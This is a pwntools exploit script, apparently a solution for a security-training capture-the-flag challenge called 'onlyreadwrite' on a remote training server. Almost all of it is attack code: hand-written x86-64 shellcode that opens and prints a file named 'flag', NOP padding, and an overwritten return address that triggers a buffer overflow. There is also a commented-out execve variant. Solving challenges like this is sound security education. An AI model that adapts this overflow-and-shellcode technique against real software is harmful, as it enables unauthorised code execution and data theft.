from pwn import *


run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/7/onlyreadwrite')
	#pid=gdb.attach(r)
	#input("wait")
else:
	r=remote("bin.training.jinblack.it",2006)


#sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])

#shellcode = asm(sc)


r.recvuntil("What is your name?")



#shellcode=b"\x31\xC0\xB0\x02\x48\xC7\xC3\x66\x6C\x61\x67\x53\x48\x89\xE7\x31\xF6\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\x31\xD2\xB2\x20\x0F\x05\x31\xC0\xB0\x01\x31\xFF\x0F\x05"
shellcode = b"\x31\xC0\xFF\xC0\xFF\xC0\x31\xF6\x48\xC7\xC3\x66\x6C\x61\x67\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x31\xC0\x48\x89\xE6\xBA\x20\x00\x00\x00\x0F\x05\x31\xC0\xFF\xC0\x31\xFF\xFF\xC7\x48\x89\xE6\x0F\x05"

shellcode = shellcode.ljust(1016,b"\x90") + p64(0x6020c0)

r.send(shellcode)



r.interactive()
